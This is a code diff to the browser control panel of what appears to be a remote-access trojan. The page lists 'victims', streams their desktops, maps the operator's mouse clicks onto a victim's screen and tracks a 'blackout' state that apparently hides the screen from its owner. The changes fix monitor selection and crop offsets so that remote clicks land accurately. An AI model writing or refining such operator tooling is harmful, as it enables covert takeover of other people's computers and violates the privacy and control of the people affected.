@@ -232,19 +232,23 @@
 
       let selectedVictim = null;
       let victimMonitors = [];
-      let capW = 1920;
-      let capH = 1080;
+
+      // ── FIXED: separate "display" dimensions (what we render) from "full" dimensions (for click math) ──
+      let displayW = 1920;
+      let displayH = 1080;
+      let fullW = 1920;
+      let fullH = 1080;
       let cropOffsetX = 0;
       let cropOffsetY = 0;
       let scaleX = 1;
       let scaleY = 1;
+
       let frameImg = null;
       let frameReady = false;
       let blackoutState = false;
       let lastFrameTime = 0;
       let fpsCounter = 0;
       let currentFPS = 0;
-      let fpsInterval = null;
 
       const socket = io({
         transports: ['websocket', 'polling'],
@@ -257,8 +261,9 @@
         canvas.height = window.innerHeight;
         canvas.style.width = canvas.width + 'px';
         canvas.style.height = canvas.height + 'px';
-        scaleX = capW / canvas.width;
-        scaleY = capH / canvas.height;
+        // Scale maps from the DISPLAY dimensions (what the victim is sending us) to canvas
+        scaleX = displayW / canvas.width;
+        scaleY = displayH / canvas.height;
       }
       window.addEventListener('resize', resize);
 
@@ -292,17 +297,23 @@
         img.src = url;
       }
 
+      // ── FIXED: compute remote coordinates with crop offset ──
       function getRemoteCoords(e) {
         const rect = canvas.getBoundingClientRect();
         let cssX = e.clientX - rect.left;
         let cssY = e.clientY - rect.top;
         cssX = Math.max(0, Math.min(cssX, canvas.width));
         cssY = Math.max(0, Math.min(cssY, canvas.height));
+
+        // Map CSS position → position within the displayed (cropped) image
         let imgX = Math.round(cssX * scaleX);
         let imgY = Math.round(cssY * scaleY);
+
+        // Add crop offset → full desktop coordinates for the victim
         let remoteX = imgX + cropOffsetX;
         let remoteY = imgY + cropOffsetY;
-        return { cssX, cssY, remoteX, remoteY };
+
+        return { cssX, cssY, imgX, imgY, remoteX, remoteY };
       }
 
       function moveCursor(e) {
@@ -315,7 +326,7 @@
       canvas.addEventListener('mousemove', function(e) {
         moveCursor(e);
         const coords = getRemoteCoords(e);
-        info.innerHTML = `${capW}x${capH} ${currentFPS}fps · <span class="coords">${coords.remoteX},${coords.remoteY}</span>`;
+        info.innerHTML = `${displayW}x${displayH} ${currentFPS}fps · <span class="coords">${coords.remoteX},${coords.remoteY}</span>`;
       });
 
       canvas.addEventListener('mouseleave', function() { cursorEl.style.display = 'none'; });
@@ -374,8 +385,13 @@
             document.getElementById('blackout-status-val').textContent = 'OFF';
             document.getElementById('blackout-method-val').textContent = '';
 
+            // Remember the full desktop dimensions
+            fullW = v.w;
+            fullH = v.h;
+
             populateMonitorSelector(v.monitors);
-            socket.emit('select-victim', { id: v.id, crop: null });
+            // Default to "full" view
+            socket.emit('select-victim', { id: v.id, monitorIndex: null });
             renderVictimList(list);
             info.textContent = `Selecting ${v.id}...`;
           });
@@ -394,7 +410,7 @@
           mons.forEach((m, i) => {
             const opt = document.createElement('option');
             opt.value = i;
-            opt.textContent = `Monitor ${i+1} (${m.w}x${m.h})${m.primary ? ' [Primary]' : ''}`;
+            opt.textContent = `Monitor ${i+1} (${m.w}x${m.h} @ ${m.x},${m.y})${m.primary ? ' [Primary]' : ''}`;
             monitorSelect.appendChild(opt);
           });
         }
@@ -403,6 +419,7 @@
         monitorSelector.style.display = 'block';
       }
 
+      // ── FIXED: monitor selector change sends proper monitorIndex ──
       monitorSelect.addEventListener('change', function() {
         if (!selectedVictim) return;
         const val = this.value;
@@ -410,7 +427,10 @@
         if (val === 'full') {
           cropOffsetX = 0;
           cropOffsetY = 0;
-          socket.emit('select-victim', { id: selectedVictim, crop: null });
+          displayW = fullW;
+          displayH = fullH;
+          resize();
+          socket.emit('select-victim', { id: selectedVictim, monitorIndex: null });
           info.textContent = `Selecting ${selectedVictim} (full desktop)...`;
         } else {
           const idx = parseInt(val);
@@ -418,10 +438,10 @@
           if (mon) {
             cropOffsetX = mon.x;
             cropOffsetY = mon.y;
-            socket.emit('select-victim', {
-              id: selectedVictim,
-              crop: { x: mon.x, y: mon.y, w: mon.w, h: mon.h }
-            });
+            displayW = mon.w;
+            displayH = mon.h;
+            resize();
+            socket.emit('select-victim', { id: selectedVictim, monitorIndex: idx });
             info.textContent = `Selecting ${selectedVictim} (monitor ${idx+1})...`;
           }
         }
@@ -472,37 +492,35 @@
         renderVictimList(list);
       });
 
+      // ── FIXED: victim-info uses displayW/displayH from server ──
       socket.on('victim-info', function(data) {
         victimMonitors = data.monitors || [];
-        capW = data.w;
-        capH = data.h;
 
-        if (data.crop) {
-          cropOffsetX = data.crop.x;
-          cropOffsetY = data.crop.y;
-        } else {
-          cropOffsetX = 0;
-          cropOffsetY = 0;
-        }
+        // Store full desktop dimensions for click math
+        fullW = data.w;
+        fullH = data.h;
+
+        // Use display dimensions (might be cropped)
+        displayW = data.displayW || data.w;
+        displayH = data.displayH || data.h;
+        cropOffsetX = data.cropOffsetX || 0;
+        cropOffsetY = data.cropOffsetY || 0;
 
         resize();
         controlsEl.style.display = 'flex';
         monitorSelector.style.display = 'block';
         populateMonitorSelector(data.monitors);
 
-        if (data.crop) {
-          const idx = (data.monitors || []).findIndex(
-            m => m.x === data.crop.x && m.y === data.crop.y &&
-                 m.w === data.crop.w && m.h === data.crop.h
-          );
-          monitorSelect.value = idx >= 0 ? String(idx) : 'full';
+        // Set the dropdown to match
+        if (data.monitorIndex !== null && data.monitorIndex !== undefined) {
+          monitorSelect.value = String(data.monitorIndex);
         } else {
           monitorSelect.value = 'full';
         }
 
         info.className = 'on';
-        const viewInfo = data.crop ? `(cropped ${data.crop.w}x${data.crop.h})` : '(full desktop)';
-        info.innerHTML = `${capW}x${capH} ${currentFPS}fps · <span class="coords">Viewing ${data.id} ${viewInfo}</span>`;
+        const viewInfo = data.crop ? `(monitor ${data.monitorIndex !== null ? data.monitorIndex + 1 : 'full'})` : '(full desktop)';
+        info.innerHTML = `${displayW}x${displayH} ${currentFPS}fps · <span class="coords">Viewing ${data.id} ${viewInfo}</span>`;
       });
 
       socket.on('frame', function(f) {
@@ -552,4 +570,3 @@
   </script>
 </body>
 </html>
-
